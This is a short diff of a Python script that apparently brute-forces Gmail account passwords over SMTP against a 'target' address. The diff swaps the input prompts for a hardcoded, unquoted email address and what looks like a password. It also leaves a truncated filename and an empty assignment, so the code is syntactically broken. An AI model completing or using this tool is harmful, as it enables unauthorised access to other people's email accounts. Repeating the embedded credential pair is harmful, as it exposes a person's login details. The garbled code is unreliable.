@@ -32,15 +32,15 @@ smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
 smtp.ehlo()
 smtp.starttls()
 
-user = input("While The Target Gmail Adress: ")
-pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")
+user = fasawlay65@gmail.com
+pwd = CMZL2005
 
 if pwd=='0':
-    passswfile="passworld.txt"
+    passswfile="passworld.tx
 
 elif pwd=='1':
     print("\n")
-    passswfile = input("Name The File Path (For Password List):")
+    passswfile =
 
 else:
     print("\n")
